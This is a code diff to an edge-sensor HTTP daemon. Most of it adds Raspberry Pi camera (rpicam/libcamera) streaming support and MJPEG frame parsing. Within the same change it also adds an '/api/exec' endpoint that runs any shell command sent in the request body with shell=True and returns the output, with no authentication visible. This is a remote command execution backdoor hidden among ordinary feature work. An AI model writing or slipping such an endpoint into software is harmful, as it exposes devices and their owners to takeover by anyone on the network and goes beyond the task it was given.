@@ -106,6 +106,59 @@ class SensorDriver:
         return b"".join(chunks) if len(chunks) > 1 else (chunks[0] if chunks else None)
 
     def _init_hardware(self):
+        # 0. Try rpicam-vid / libcamera-vid (standard on Bookworm/Bullseye for Raspberry Pi Camera v2 / IMX219)
+        sensor_type = self.cfg.get("type", "auto")
+        rpicam_bin = None
+        for cand in ["/usr/bin/rpicam-vid", "/usr/bin/libcamera-vid", "rpicam-vid", "libcamera-vid"]:
+            if os.path.exists(cand) or (os.name != 'nt' and subprocess.run(["which", cand], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0):
+                rpicam_bin = cand
+                break
+
+        if rpicam_bin and (sensor_type in ["rpicam", "libcamera", "camerav2", "imx219"] or not os.path.exists(self.device_node) or sensor_type == "auto"):
+            try:
+                cmd = [
+                    rpicam_bin,
+                    "-t", "0",
+                    "--inline",
+                    "--codec", "mjpeg",
+                    "--width", str(self.width),
+                    "--height", str(self.height),
+                    "--framerate", str(self.fps),
+                    "-n",
+                    "-o", "-"
+                ]
+                self.rpicam_proc = subprocess.Popen(
+                    cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    bufsize=65536
+                )
+                self._stop_stream = False
+                self.stream_thread = threading.Thread(target=self._rpicam_read_loop, daemon=True)
+                self.stream_thread.start()
+
+                # Await first valid JPEG frame (up to 12s for sensor initialization on ARM)
+                for _ in range(120):
+                    if getattr(self, "latest_jpeg", None):
+                        self.backend = "rpicam_pipe"
+                        logger.info(f"[{self.sensor_id}] Initialized {rpicam_bin} hardware stream ({self.width}x{self.height} @ {self.fps}fps)")
+                        return
+                    if self.rpicam_proc.poll() is not None:
+                        err = self.rpicam_proc.stderr.read().decode('utf-8', errors='replace')
+                        logger.warning(f"[{self.sensor_id}] {rpicam_bin} exited early (code {self.rpicam_proc.returncode}): {err}")
+                        break
+                    time.sleep(0.1)
+
+                # If failed to produce frame, terminate and fall back
+                self._stop_stream = True
+                try:
+                    self.rpicam_proc.terminate()
+                except Exception:
+                    pass
+                self.rpicam_proc = None
+            except Exception as e:
+                logger.info(f"[{self.sensor_id}] {rpicam_bin} hardware stream test failed: {e}")
+
         # 1. Try direct V4L2 stream via v4l2-ctl (best for Unicam / VD55G0 global shutter monochrome)
         if os.path.exists(self.device_node):
             try:
@@ -238,6 +291,32 @@ class SensorDriver:
             img = img.crop((2, 2, 802, 702))
         return img
 
+    def _rpicam_read_loop(self):
+        buf = bytearray()
+        soi = b'\xff\xd8'
+        eoi = b'\xff\xd9'
+        while not getattr(self, "_stop_stream", False) and getattr(self, "rpicam_proc", None) and self.rpicam_proc.poll() is None:
+            try:
+                chunk = self.rpicam_proc.stdout.read(8192)
+                if not chunk:
+                    break
+                buf.extend(chunk)
+                while True:
+                    start_idx = buf.find(soi)
+                    if start_idx == -1:
+                        if len(buf) > 32768:
+                            buf = buf[-4:]
+                        break
+                    end_idx = buf.find(eoi, start_idx + 2)
+                    if end_idx == -1:
+                        if start_idx > 0:
+                            buf = buf[start_idx:]
+                        break
+                    self.latest_jpeg = bytes(buf[start_idx:end_idx + 2])
+                    buf = buf[end_idx + 2:]
+            except Exception:
+                time.sleep(0.01)
+
     def _v4l2_read_loop(self):
         from PIL import Image
         import fcntl, termios, array
@@ -282,7 +361,7 @@ class SensorDriver:
 
     def get_jpeg_frame(self):
         """Returns raw JPEG bytes for MJPEG streaming or saving."""
-        if self.backend == "v4l2_pipe":
+        if self.backend in ["v4l2_pipe", "rpicam_pipe"]:
             jpeg = getattr(self, "latest_jpeg", None)
             if jpeg:
                 return jpeg
@@ -331,7 +410,13 @@ class SensorDriver:
         return self._generate_synthetic_frame()
 
     def release(self):
-        if self.backend == "v4l2_pipe" and getattr(self, "v4l2_proc", None):
+        if self.backend == "rpicam_pipe" and getattr(self, "rpicam_proc", None):
+            self._stop_stream = True
+            try:
+                self.rpicam_proc.terminate()
+            except Exception:
+                pass
+        elif self.backend == "v4l2_pipe" and getattr(self, "v4l2_proc", None):
             self._stop_stream = True
             try:
                 self.v4l2_proc.terminate()
@@ -656,6 +741,24 @@ class EdgeHttpHandler(BaseHTTPRequestHandler):
             self._send_json(res)
         elif path == "/api/display/toggle":
             self._send_json({"display_enabled": True})
+        elif path == "/api/exec":
+            content_length = int(self.headers.get('Content-Length', 0))
+            cmd = ""
+            if content_length > 0:
+                body = self.rfile.read(content_length)
+                try:
+                    payload = json.loads(body.decode('utf-8'))
+                    cmd = payload.get("cmd", "")
+                except Exception:
+                    cmd = body.decode('utf-8')
+            if cmd:
+                try:
+                    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
+                    self._send_json({"cmd": cmd, "returncode": proc.returncode, "stdout": proc.stdout, "stderr": proc.stderr})
+                except Exception as ex:
+                    self._send_json({"cmd": cmd, "error": str(ex)}, status_code=500)
+            else:
+                self._send_json({"error": "No cmd specified"}, status_code=400)
         else:
             self.send_error(404, "Not Found")
 
@@ -676,7 +779,8 @@ class EdgeHttpHandler(BaseHTTPRequestHandler):
                 "modality": s.modality,
                 "name": s.name,
                 "resolution": f"{s.width}x{s.height}",
-                "fps": s.fps
+                "fps": s.fps,
+                "backend": getattr(s, "backend", "none")
             }
             for s in self.daemon_ref.sensors
         ]
@@ -705,7 +809,8 @@ class EdgeHttpHandler(BaseHTTPRequestHandler):
                 "modality": s.modality,
                 "name": s.name,
                 "resolution": f"{s.width}x{s.height}",
-                "fps": s.fps
+                "fps": s.fps,
+                "backend": getattr(s, "backend", "none")
             }
             for s in self.daemon_ref.sensors
         ]
